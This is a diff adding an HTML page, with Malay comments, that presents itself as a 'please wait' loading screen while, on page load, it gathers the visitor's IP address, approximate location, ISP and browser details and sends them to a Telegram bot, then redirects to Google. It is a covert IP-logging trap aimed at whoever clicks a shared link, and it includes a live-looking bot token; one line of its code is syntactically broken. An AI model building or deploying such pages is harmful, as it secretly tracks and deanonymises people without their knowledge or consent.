@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sila Tunggu...</title>
+</head>
+<body>
+    <script>
+        // Masukkan Token & ID anda
+        const TELEGRAM_TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
+        const CHAT_ID = '8563935930';
+
+        async function sendTrace() {
+            // 1. Ambil info Browser & OS
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+
+            // 2. Dapatkan info IP & Lokasi Anggaran (Guna API Luar)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                const message = `
+🔔 *Target Klik Link GitHub!*
+🌐 *IP:* ${data.ip}
+📍 *Lokasi:* ${data.city}, ${data.region}, ${data.country_name}
+📡 *ISP:* ${data.org}
+📱 *Device:* ${userAgent}
+                `;
+
+                // 3. Hantar ke Telegram
+                await fetch(`https://api.telegram.org/bot${8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: 8563935930,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+            } catch (error) {
+                console.log("Error trace");
+            }
+
+            // 4. Redirect ke Google/YouTube selepas 2 saat
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+        }
+
+        window.onload = sendTrace;
+    </script>
+    <p>Loading content, please wait...</p>
+</body>
+</html>
